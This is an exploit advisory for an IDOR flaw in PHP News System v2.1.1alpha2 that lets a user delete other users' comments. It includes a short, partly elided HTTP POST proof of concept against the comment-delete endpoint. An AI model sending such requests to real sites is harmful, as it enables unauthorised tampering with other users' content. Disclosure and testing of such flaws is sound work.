# Exploit Title: PHP News System v2.1.1alpha2 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/phpns/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHP News System
## Version: v2.1.1alpha2
## Exploit Description:
## PHP News System v2.1.1alpha2 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to delete comment that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /article.php?do=comments&id=4&action=delete HTTP/1.1
...
3=3(CHANGE HERE)
```